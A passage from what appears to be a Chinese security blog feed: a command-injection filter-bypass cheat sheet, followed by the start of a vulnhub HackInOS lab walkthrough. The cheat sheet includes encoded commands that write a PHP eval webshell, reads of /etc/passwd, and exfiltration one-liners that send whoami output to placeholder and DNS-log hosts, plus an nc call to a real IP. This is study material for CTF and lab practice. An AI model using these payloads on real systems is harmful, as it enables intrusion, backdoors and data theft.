escapeshellcmd($command);</span><br><span class="line">    file_put_contents('out.bat',$escaped_command);</span><br><span class="line">    system('out.bat');</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="ç»•è¿‡-escapeshellcmd"><a href="#ç»•è¿‡-escapeshellcmd" class="headerlink" title="ç»•è¿‡ escapeshellcmd"></a>ç»•è¿‡ escapeshellcmd</h3><ul><li>win ä¸‹æ‰§è¡Œ bat</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command = <span class="string">'dir '</span>.$_POST[<span class="string">'dir'</span>];</span><br><span class="line">$escaped_command = escapeshellcmd($command);</span><br><span class="line">var_dump($escaped_command);</span><br><span class="line">file_put_contents(<span class="string">'out.bat'</span>,$escaped_command);</span><br><span class="line">system(<span class="string">'out.bat'</span>);</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ.batæ–‡ä»¶çš„æ—¶å€™ï¼Œåˆ©ç”¨%1aï¼Œå¯ä»¥ç»•è¿‡è¿‡æ»¤æ‰§è¡Œå‘½ä»¤ã€‚</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">dir</span>=../ %<span class="number">1</span>a whoami</span><br></pre></td></tr></table></figure><h3 id="ç©ºæ ¼"><a href="#ç©ºæ ¼" class="headerlink" title="ç©ºæ ¼"></a>ç©ºæ ¼</h3><ul><li>${IFS}</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;flag</span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;<span class="variable">$9flag</span></span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">IFS<span class="variable">$9flag</span></span></span><br><span class="line"><span class="meta">cat%</span><span class="bash">09flag  <span class="comment"># \0x09 æ˜¯ TAB</span></span></span><br></pre></td></tr></table></figure><ul><li>é‡å®šå‘ç¬¦&lt;&gt;</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;&gt;flag</span><br><span class="line">cat&lt;flag</span><br></pre></td></tr></table></figure><h3 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a>é»‘åå•ç»•è¿‡</h3><ul><li>æ‹¼æ¥</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=flag;$a$b $c</span><br></pre></td></tr></table></figure><ul><li>åˆ©ç”¨å·²å­˜åœ¨çš„èµ„æº</li></ul><p>ä»å·²æœ‰çš„æ–‡ä»¶æˆ–è€…ç¯å¢ƒå˜é‡ä¸­è·å¾—ç›¸åº”çš„å­—ç¬¦ã€‚</p><ul><li>ç¼–ç </li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`echo "Y2F0IGZsYWc="|base64 -d`</span><br><span class="line">echo "Y2F0IGZsYWc="|base64 -d|bash</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">(<span class="built_in">printf</span> <span class="string">"\x63\x61\x74\x20\x66\x6c\x61\x67"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">å¯ä»¥é€šè¿‡è¿™æ ·æ¥å†™webshell,å†…å®¹ä¸º&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>]);?&gt;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> &#123;<span class="built_in">printf</span>,<span class="string">"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"</span>&#125; &gt;&gt; 1.php</span></span><br></pre></td></tr></table></figure><ul><li>å•å¼•å·ã€åŒå¼•å·</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c""at fl''ag</span><br><span class="line">c'a't f'l'ag</span><br></pre></td></tr></table></figure><ul><li>åæ–œçº¿ \</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure><ul><li>é€šé…ç¬¦</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/?in/?s =&gt; ls</span><br><span class="line"></span><br><span class="line">* 0åˆ°æ— ç©·ä¸ªä»»æ„å­—ç¬¦</span><br><span class="line">? ä¸€ä¸ªä»»æ„å­—ç¬¦</span><br><span class="line">[ ] ä¸€ä¸ªåœ¨æ‹¬å·å†…çš„å­—ç¬¦ï¼Œe.g. [abcd]</span><br><span class="line">[ - ] åœ¨ç¼–ç é¡ºåºå†…çš„æ‰€æœ‰å­—ç¬¦</span><br><span class="line">[^ ] ä¸€ä¸ªä¸åœ¨æ‹¬å·å†…çš„å­—ç¬¦</span><br><span class="line">[! ] åŒ ^</span><br><span class="line">cat fl[0-z]g</span><br><span class="line"></span><br><span class="line">echo d&#123;a,e,i,u,o&#125;g =&gt; dag deg dig dug dog</span><br><span class="line">echo &#123;fl,fla&#125;&#123;ag,g&#125; =&gt; flag flg flaag flag</span><br><span class="line">echo fl&#123;0..z&#125;g =&gt; fl1g,fl2g,...,flyg,flzg</span><br><span class="line"></span><br><span class="line">èŠ±æ‹¬å·æ‹“å±•&#123;OS_COMMAND,ARGUMENT&#125;</span><br><span class="line">åœ¨Linux bashä¸­è¿˜å¯ä»¥ä½¿ç”¨&#123;cat,/etc/passwd&#125;æ¥ç»•è¿‡</span><br><span class="line">è¿™é‡Œæ²¡å®éªŒæˆåŠŸ</span><br></pre></td></tr></table></figure><ul><li>æœªå®šä¹‰å˜é‡</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">cat$</span><span class="bash">x /etc/passwd</span></span><br></pre></td></tr></table></figure><ul><li>å¯å˜å‡½æ•°</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(sy.(st).em)(whoami)</span><br><span class="line"><span class="variable">$_GET</span>[a](<span class="variable">$_GET</span>[b].<span class="variable">$_GET</span>[c])</span><br><span class="line"></span><br><span class="line">è·å–å†…ç½®å‡½æ•°<span class="built_in"> system </span>çš„ç´¢å¼•åï¼Œç›´æ¥æ‰§è¡Œ</span><br><span class="line">get_defined_functions()[internal] | grep ststem</span><br><span class="line">get_defined_functions()[internal][381](whoami)</span><br></pre></td></tr></table></figure><ul><li><code>$@</code></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ c<span class="variable">$@at</span> fl<span class="variable">$@ag</span></span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line"></span><br><span class="line">$ echo i<span class="variable">$@d</span></span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">$ i<span class="variable">$@d</span></span><br><span class="line"><span class="attribute">uid</span>=1000(wywwzjj) <span class="attribute">gid</span>=1000(wywwzjj) <span class="attribute">groups</span>=1000(wywwzjj)</span><br><span class="line"></span><br><span class="line">$ echo i<span class="variable">$@d</span>|<span class="variable">$0</span></span><br><span class="line"><span class="attribute">uid</span>=1000(wywwzjj) <span class="attribute">gid</span>=1000(wywwzjj) <span class="attribute">groups</span>=1000(wywwzjj)</span><br><span class="line"></span><br><span class="line">$ echo &#123;nc,47.101.220.241,2333&#125;|<span class="variable">$0</span></span><br><span class="line">ç›´æ¥è¿ nc äº†ã€‚ã€‚ã€‚<span class="variable">$0</span> å¥½ç‰›é€¼ï¼Ÿ</span><br><span class="line"><span class="variable">$0</span> å°±ç›¸å½“äº bash å¦å¤– <span class="variable">$n</span> è¡¨ç¤ºå‘½ä»¤è¡Œç¬¬ n ä¸ªå‚æ•°</span><br><span class="line"></span><br><span class="line">$ <span class="variable">$0</span>&lt;&lt;&lt;i<span class="variable">$@d</span></span><br><span class="line"><span class="attribute">uid</span>=1000(wywwzjj) <span class="attribute">gid</span>=1000(wywwzjj) <span class="attribute">groups</span>=1000(wywwzjj)</span><br></pre></td></tr></table></figure><ul><li>åˆ©ç”¨å·²ç»å­˜åœ¨çš„èµ„æº</li></ul><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">echo</span> $PATH</span><br><span class="line"><span class="string">/usr/local/sbin</span>:<span class="string">/usr/local/bin</span>:<span class="string">/usr/sbin</span>:<span class="string">/usr/bin</span>:<span class="string">/sbin</span>:<span class="string">/bin</span></span><br><span class="line"></span><br><span class="line">$ <span class="keyword">echo</span> $PATH| cut -c 1</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">$ <span class="keyword">echo</span> $PATH| cut -c 1-4</span><br><span class="line"><span class="string">/usr</span></span><br></pre></td></tr></table></figure><ul><li>${PS2} å¯¹åº”å­—ç¬¦ â€˜&gt;â€™</li><li>${PS4} å¯¹åº”å­—ç¬¦ â€˜+â€™</li><li>${IFS} å¯¹åº” å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦</li><li>${9} å¯¹åº” ç©ºå­—ç¬¦ä¸²</li></ul><h3 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h3><ul><li><p>å¼¹ shell</p></li><li><p>DNS å¤–å¸¦æ•°æ®</p></li></ul><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"http://testhash.test.dnslog.link/?`whoami`"</span></span><br></pre></td></tr></table></figure><ul><li>HTTP å¤–å¸¦</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> linux</span></span><br><span class="line">curl http://evil-server/`whoami`</span><br><span class="line">wget http://evil-server/$(whoami)</span><br><span class="line">curl xxxx.ceye.io/`whoami`</span><br><span class="line">curl http://xxxx.ceye.io/$(id|base64)</span><br><span class="line">ping -c 1 `whoami`.xxxx.ceye.io</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> windows</span></span><br><span class="line">http:</span><br><span class="line">for /F %x in ('whoami') do start http://xxx.ceye.io/%x</span><br><span class="line">dnsè¯·æ±‚ï¼š</span><br><span class="line">è·å–è®¡ç®—æœºåï¼šfor /F "delims=" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line">è·å–ç”¨æˆ·åï¼šfor /F "delims= tokens=2" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line"></span><br><span class="line">for /F %x in ('whoami') do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%x'));$b=New-Object System.Net.WebClient;$b.DownloadString('http://xxx.ceye.io/'+$a);</span><br></pre></td></tr></table></figure><h3 id="é•¿åº¦é™åˆ¶"><a href="#é•¿åº¦é™åˆ¶" class="headerlink" title="é•¿åº¦é™åˆ¶"></a>é•¿åº¦é™åˆ¶</h3><ul><li>æ–‡ä»¶æ„é€ ï¼ˆå‚è€ƒæ©˜å­é‚£ä¸ª hitconï¼‰</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">w</span></span><br><span class="line">å°†ä¼šåˆ›å»ºä¸€ä¸ªåå­—ä¸º w çš„ç©ºæ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure><p>å·¥å…·</p><ul><li><a href="https://github.com/ewilded/shelling" target="_blank" rel="noopener">shelling</a></li></ul><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw" target="_blank" rel="noopener">å·§ç”¨å‘½ä»¤æ³¨å…¥çš„ N ç§å§¿åŠ¿</a></p><p><a href="https://chybeta.github.io/2017/08/15/å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›ç»•è¿‡æŠ€å·§/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ç›´æ¥æ‰§è¡Œä»£ç &quot;&gt;&lt;a href=&quot;#ç›´æ¥æ‰§è¡Œä»£ç &quot; class=&quot;headerlink&quot; title=&quot;ç›´æ¥æ‰§è¡Œä»£ç &quot;&gt;&lt;/a&gt;ç›´æ¥æ‰§è¡Œä»£ç &lt;/h2&gt;&lt;p&gt;PHP ä¸­æœ‰ä¸å°‘å¯ä»¥ç›´æ¥æ‰§è¡Œä»£ç çš„å‡½æ•°ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;
      
    
    </summary>
    
    
      <category term="å‘½ä»¤æ³¨å…¥" scheme="https://wywwzjj.top/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub é¶æœºå®æˆ˜ç³»åˆ— HackInOS</title>
    <link href="https://wywwzjj.top/2019/04/07/vulnhub-%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-HackInOS/"/>
    <id>https://wywwzjj.top/2019/04/07/vulnhub-é¶æœºå®æˆ˜ç³»åˆ—-HackInOS/</id>
    <published>2019-04-07T13:24:18.000Z</published>
    <updated>2019-09-14T08:43:45.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å®æˆ˜å¥½ç©ï¼Œç´§å¼ åˆºæ¿€ï¼Œä½†å¾ˆéš¾èƒ½é’ˆå¯¹æ€§åœ°ç»ƒä¹ æŸä¸€ç§çŸ¥è¯†ï¼Œæ›´åƒæ˜¯ä¸€ç§ç»¼åˆæ€§çš„è€ƒè¯•ã€‚</p><p>å…¶æ¬¡ï¼Œå¤§ç‰›éƒ½è¯´ï¼Œæ¸—é€æµ‹è¯•çš„æœ¬è´¨å°±æ˜¯ä¿¡æ¯æ”¶é›†ï¼Œä¿¡æ¯æ”¶é›†çš„å……åˆ†æ€§å†³å®šäº†æ—¥ä¸‹æ¥çš„å¯èƒ½æ€§ã€‚å¯æƒœï¼Œä¿¡æ¯æ”¶é›†æœ€è€—è´¹çš„å°±æ˜¯æ—¶é—´ã€‚å¯¹äºæ–°æ‰‹æ¥è¯´ï¼Œå¾ˆå®¹æ˜“å¾—ä¸å¿å¤±ã€‚è¿™é‡Œè¡¨è¾¾å¹¶éæ˜¯ä¿¡æ¯æ”¶é›†ä¸éœ€è¦ç»ƒä¹ ï¼Œè€Œæ˜¯æ•ˆç›Šä¸é«˜ï¼Œå¹³æ—¶çš„ä¾§é‡ç‚¹æ›´åº”è¯¥æ”¾åˆ°å¯¹æ¼æ´çš„æ•æ„Ÿæ€§è®­ç»ƒä¸Šï¼Œå¦åˆ™å³ä½¿ä½ é‡åˆ°æ¼æ´ä¾ç„¶å‘ç°ä¸äº†ï¼Œæ“¦è‚©è€Œè¿‡ã€‚</p><p>æ‰€ä»¥è¯´ï¼ŒCTF é¢˜ç›®çš„ç»ƒä¹ æ˜¯å¾ˆé‡è¦çš„ï¼Œå°†æ¯ä¸ªåŠ¨ä½œè¿›è¡Œåˆ†è§£ï¼Œç»ƒç†Ÿï¼Œä»¥åé‡åˆ°ç»¼åˆæ€§çš„æ¸—é€ä¹Ÿèƒ½æ¸¸åˆƒæœ‰ä½™ã€‚å¤§å‹çš„ CTF è€ƒå¯Ÿçš„æ›´æ˜¯å¿«é€Ÿå­¦ä¹ çš„èƒ½åŠ›ï¼Œå¹³å¸¸å‡ºçƒ‚äº†çš„å¥—è·¯é¢˜åŸºæœ¬ä¸ä¼šå‡ºç°ï¼Œæ²¡å¤šå¤§æ„ä¹‰ã€‚ä¸€ä¸ªé™Œç”Ÿçš„æƒ…æ™¯ä¸‹ï¼Œå¯¹ä¿¡æ¯çš„æœé›†ã€æ¼æ´çš„å¿«é€Ÿé”å®šä»¥åŠæ¼æ´çš„åˆ©ç”¨èƒ½åŠ›è¦æ±‚éå¸¸é«˜ï¼Œå¾€å¾€éœ€è¦æ·±å…¥åˆ°æºç åº•å±‚ï¼Œç›´æ¥å¤åˆ¶ä¸ª <code>exp</code> æ‰“è¿‡å»åŸºæœ¬ä¸ä¼šè§æ•ˆã€‚å‡ºé¢˜äººåˆä¸è„‘æ®‹ï¼Œéšä¾¿æ‰¾ä¸ªæ´å°±æ¥å‡ºé¢˜ï¼Œæˆ–è€…ç®€å•ç²—æš´çš„æŠŠç¯å¢ƒæ¬è¿‡æ¥ï¼Œä¸æ˜¯ç­‰äººå–·å—ï¼Ÿ</p><p>åºŸè¯ä¸å¤šè¯´ï¼Œå›åˆ°å’±ä»¬çš„é¶æœºã€‚</p><p>çœ‹äº† <code>d3ckx1</code> å¤§ä½¬çš„ä¸€äº›é¶æœºæ¸—é€çš„<a href="https://www.anquanke.com/member/124858" target="_blank" rel="noopener">æ–‡ç« </a>ï¼Œå¿ƒé‡Œä¹Ÿç—’ç—’çš„ï¼Œè‡ªå·±ä¹Ÿæƒ³è¯•è¯•èƒ½ä¸èƒ½æ—¥è¿›å» ï¼šï¼‰ã€‚</p><p>ç„¶è€Œï¼Œè¿˜æ²¡å¼€å§‹å°±ç»“æŸäº†å•Šï¼Œ<code>nmap</code> å’Œ <code>netdiscover</code> éƒ½æ²¡æ‰«åˆ° IPï¼Œæœ‰ç‚¹å°´å°¬ã€‚</p><p>æ³¨æ„å¼€æ¡¥æ¥æ¨¡å¼ï¼åœ¨æ­¤é¡ºä¾¿è¡¥å……ä¸‹å¸¸ç”¨çš„å‡ ç§<strong>è™šæ‹Ÿæœºç½‘ç»œæ¨¡å¼</strong>ã€‚</p><ul><li><p>bridgedï¼ˆæ¡¥æ¥æ¨¡å¼ï¼‰</p><p>  åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œä½¿ç”¨ <code>VMnet0</code> è™šæ‹Ÿäº¤æ¢æœºï¼Œè™šæ‹Ÿæœºå°±åƒæ˜¯å±€åŸŸç½‘ä¸­çš„ä¸€å°ç‹¬ç«‹çš„ä¸»æœºï¼Œä¸å®¿ä¸»æœºä¸€æ ·ï¼Œå®ƒå¯ä»¥è®¿é—®ç½‘ç»œå†…ä»»ä½•ä¸€å°æœºå™¨ã€‚åœ¨æ¡¥æ¥æ¨¡å¼ä¸‹ï¼Œå¯ä»¥æ‰‹å·¥é…ç½®å®ƒçš„ <code>TCP/IP</code> é…ç½®ä¿¡æ¯ï¼ˆ<code>IP</code>ã€å­ç½‘æ©ç ç­‰ï¼Œè€Œä¸”è¿˜è¦å’Œå®¿ä¸»æœºå¤„äºåŒä¸€ç½‘æ®µï¼‰ï¼Œä»¥å®ç°é€šè¿‡å±€åŸŸç½‘çš„ç½‘å…³æˆ–è·¯ç”±å™¨è®¿é—®äº’è”ç½‘ï¼Œè¿˜å¯ä»¥å°† <code>IP</code> å’Œ <code>DNS</code> è®¾ç½®æˆâ€è‡ªåŠ¨è·å–â€œã€‚</p><p>  åœ¨æ¡¥æ¥æ¨¡å¼ä¸­ï¼Œä½¿ç”¨VMnet0è™šæ‹Ÿäº¤æ¢æœºï¼Œæ­¤æ—¶è™šæ‹Ÿæœºç›¸å½“ä¸ç½‘ç»œä¸Šçš„ä¸€å°ç‹¬ç«‹è®¡ç®—æœºä¸ä¸»æœºä¸€æ ·ï¼Œæ‹¥æœ‰ä¸€ä¸ªç‹¬ç«‹çš„IPåœ°å€ã€‚</p><ul><li><p>A1ã€A2ã€Aã€B å››ä¸ªæ“ä½œç³»ç»Ÿå¯ä»¥ç›¸äº’è®¿é—®</p></li><li><p>A1ã€A2 çš„ IP ä¸ºâ€œå¤–ç½‘â€ IPï¼Œå¯ä»¥æ‰‹åŠ¨è®¾ç½®ï¼Œä¹Ÿå¯ä»¥è‡ªåŠ¨è·å–</p><p><img src="http://images0.cnblogs.com/blog/33509/201305/06230732-2bf87fc799ef41c989be329c62a3fe80.png" alt></p></li></ul></li><li><p>NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢æ¨¡å¼ï¼‰</p><p>  ä½¿ç”¨ <code>NAT</code> æ¨¡å¼ï¼Œå°±æ˜¯è®©è™šæ‹Ÿæœºå€ŸåŠ© <code>NAT</code> ï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰åŠŸèƒ½ï¼Œé€šè¿‡å®¿ä¸»æœºæ‰€åœ¨çš„ç½‘ç»œæ¥è®¿é—®å…¬ç½‘ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä½¿ç”¨ <code>NAT</code> æ¨¡å¼å¯ä»¥å®ç°åœ¨è™šæ‹Ÿç³»ç»Ÿé‡Œè®¿é—®äº’è”ç½‘ã€‚<code>NAT</code> æ¨¡å¼ä¸‹è™šæ‹Ÿæœºçš„ <code>TCP/IP</code> é…ç½®ä¿¡æ¯æ˜¯ç”± <code>VMnet8</code> è™šæ‹Ÿç½‘ç»œçš„ <code>DHCP</code> æœåŠ¡å™¨æä¾›çš„ï¼Œå› æ­¤ <code>IP</code> å’Œ <code>DNS</code> ä¸€èˆ¬è®¾ç½®ä¸ºâ€œè‡ªåŠ¨è·å–â€ï¼Œå› æ­¤è™šæ‹Ÿç³»ç»Ÿä¹Ÿå°±æ— æ³•å’Œæœ¬å±€åŸŸç½‘ä¸­çš„å…¶ä»–çœŸå®ä¸»æœºè¿›è¡Œé€šè®¯ã€‚</p><p>  æœ€å¤§çš„ä¼˜åŠ¿æ˜¯ï¼Œè™šæ‹Ÿæœºæ¥å…¥äº’è”ç½‘éå¸¸ç®€å•ï¼Œä¸éœ€è¦è¿›è¡Œå…¶ä»–çš„é…ç½®ï¼Œåªè¦å®¿ä¸»æœºèƒ½è”ç½‘å³å¯ã€‚</p><p>  <strong>å¦‚ä¸‹å›¾æ‰€ç¤º</strong></p><ul><li><p>A1ã€A2 å¯ä»¥è®¿é—® B</p></li><li><p>B ä¸å¯ä»¥è®¿é—® A1ã€A2</p></li><li><p>A1ã€A2ã€Aç›¸äº’è®¿é—®</p></li><li><p>A1ã€A2 çš„ IP ä¸ºå±€åŸŸç½‘ IPï¼Œå¯ä»¥æ‰‹åŠ¨é…ç½®ï¼Œä¹Ÿå¯ä»¥è‡ªåŠ¨è·å–</p><p><img src="http://images0.cnblogs.com/blog/33509/201305/06230741-3447f387a8f14f528ff5a23f5b569145.png" alt></p></li></ul></li><li><p>host-onlyï¼ˆä¸»æœºæ¨¡å¼ï¼‰</p><p>  è™šæ‹Ÿæœºåªèƒ½ä¸è™šæ‹Ÿæœºã€ä¸»æœºäº’è®¿ï¼Œä½†è™šæ‹Ÿæœºå’Œå¤–éƒ¨çš„ç½‘ç»œæ˜¯è¢«éš”ç¦»å¼€çš„ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½ä¸Š <code>Internet</code>ã€‚</p><p>  åœ¨ host-only æ¨¡å¼ä¸‹ï¼Œè™šæ‹Ÿç³»ç»Ÿçš„ TCP/IP é…ç½®ä¿¡æ¯ï¼ˆå¦‚IPåœ°å€ã€ç½‘å…³åœ°å€ã€DNSæœåŠ¡å™¨ç­‰ï¼‰ï¼Œéƒ½æ˜¯ç”±VMnet1 è™šæ‹Ÿç½‘ç»œçš„ DHCP æœåŠ¡å™¨æ¥åŠ¨æ€åˆ†é…çš„ã€‚</p><p>  ä½¿ç”¨host-onlyæ–¹å¼ï¼š</p><ul><li><p>Aã€A1ã€A2 å¯ä»¥äº’è®¿</p></li><li><p>A1ã€A2 ä¸èƒ½è®¿é—® B</p></li><li><p>B ä¸èƒ½è®¿é—® A1ã€A2</p></li><li><p>A1ã€A2 ä¸ºå±€åŸŸç½‘ IPï¼Œå¯ä»¥æ‰‹åŠ¨é…ç½®ï¼Œä¹Ÿå¯ä»¥è®¾ç½®æˆè‡ªåŠ¨è·å–æ¨¡å¼</p><p><img src="http://images0.cnblogs.com/blog/33509/201305/06230823-03336f6007ce428c80418ae11161dc22.png" alt></p></li></ul></li></ul><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>å…ˆæ‰¾ IPï¼Œ<code>netdiscover</code> å¯åŠ¨ï¼æ‰«åŠå¤©è¿˜æ˜¯æ‰«ä¸åˆ° IPï¼Œè¿™ç§ç„å­¦é—®é¢˜è¿˜æ˜¯çµæ´»è§£å†³ä¸€ä¸‹å§ã€‚æ¢æˆæ¡¥æ¥æ¨¡å¼åé‡å¯ï¼Œè®¿å®¢æ¨¡å¼è¿›å»ç›´æ¥æŸ¥çœ‹ IPã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1xne1vfncj20j20c7gob.jpg" alt></p><p>ç´§æ¥ç€æŸ¥çœ‹ç«¯å£ä¿¡æ¯</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1xnerjyghj20nx0b94bh.jpg" alt></p><h3 id="æºç æ³„éœ²"><a href="#æºç æ³„éœ²" class="headerlink" title="æºç æ³„éœ²"></a>æºç æ³„éœ²</h3><p>æ‰«ç›®å½•å‘ç°æœ‰ <code>/upload.php</code> ï¼ŒæŸ¥çœ‹æºç å¯å¾— GitHub é“¾æ¥ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1zlqwx1alj20eq01xjrb.jpg" alt></p><p>æ¥ä¸€æ³¢ä»£ç å®¡è®¡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">$rand_number = rand(<span class="number">1</span>,<span class="number">100</span>);</span><br><span class="line">$target_dir = <span class="string">"uploads/"</span>;</span><br><span class="line">    <span class="comment">// ç›´æ¥çˆ†ç ´</span></span><br><span class="line">$target_file = $target_dir . md5(basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$rand_number));</span><br><span class="line">$file_name = $target_dir . basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">$uploadOk = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// shell.php/.</span></span><br><span class="line">$imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION));</span><br><span class="line">$type = $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">    <span class="comment">// 